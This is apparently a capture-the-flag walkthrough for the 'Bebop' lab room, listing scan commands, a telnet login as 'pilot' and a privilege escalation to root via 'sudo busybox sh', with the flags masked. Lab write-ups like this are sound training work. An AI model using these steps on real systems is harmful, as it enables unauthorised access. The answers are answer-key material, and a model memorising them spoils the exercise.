# Bebop

- Deploy the machine

	  no answer needed

- What is your codename?

	- `pilot`

- What is the User Flag?

	- `scilla port -target <TARGET_IP>`
	- `nmap -p 22,23 -A <TARGET_IP>`
	- `telnet <TARGET_IP> 23` as `pilot`
	- `ls`
	- `cat user.txt`
	- `**********************`

- What is the Root Flag?

	- `sudo -l`
	- `(root) NOPASSWD: /usr/local/bin/busybox`
	- Visit GTFObins, busybox.
	- `sudo busybox sh`
	- `id`
	- `cat /root/root.txt`
	- `**************************`

- What is the low privilleged user?

	- `pilot`

- What binary was used to escalate privileges?

	- `busybox`

- What service was used to gain an initial shell?

	- `telnet`

- What Operating System does the drone run?

	- `FreeBSD`

- Watch the video.

	  no answer needed


